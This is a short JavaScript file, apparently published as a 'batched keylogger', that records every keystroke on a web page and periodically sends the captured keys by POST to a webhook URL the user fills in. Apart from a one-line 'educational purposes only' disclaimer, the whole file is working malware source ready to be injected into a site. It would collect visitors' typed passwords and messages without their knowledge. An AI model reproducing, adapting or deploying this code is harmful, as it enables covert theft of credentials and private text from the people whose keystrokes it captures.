(function () {
    // keys - batched keylogger by xcorr.
    // NOTE: For educational purposes only. Unauthorized use is prohibited.
    // See more at: https://github.com/xcorrr
	
    let buffer = [];
    const MAX_BUFFER_SIZE = 100;

    function FormatSpecialKeys(key) {
        const Specials = {
            " ": "[Space]",
            "Enter": "[Ent]\n",
            "Tab": "[Tab]",
            "Backspace": "[Backspace]",
            "Escape": "[Esc]",
            "Esc": "[Esc]",
            "Shift": "[Shift]",
            "Control": "[Ctrl]",
            "Ctrl": "[Ctrl]",
            "Alt": "[Alt]",
            "Meta": "[Meta]",
            "Delete": "[Del]",
            "CapsLock": "[Caps]",
            "ArrowUp": "[Up]",
            "ArrowDown": "[Down]",
            "ArrowLeft": "[Left]",
            "ArrowRight": "[Right]"
        };
        return Specials[key] || key;
    }

    function sendBuffer() {
        if (buffer.length === 0) return;

        const dataToSend = buffer.join(" ");
        buffer = [];

        fetch("YOUR_WEBHOOK_URL_HERE", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: "```keys logged: " + new Date().toLocaleString() + "\nKeys: " + dataToSend + ".```"
            })
        }).catch(err => console.error("err:", err));
    }

    document.addEventListener("keydown", (e) => {
        const formattedKey = FormatSpecialKeys(e.key);
        buffer.push(formattedKey);

        if (buffer.length >= MAX_BUFFER_SIZE) {
            sendBuffer();
        }
    });

    setInterval(() => {
        sendBuffer();
    }, 10000);
})();
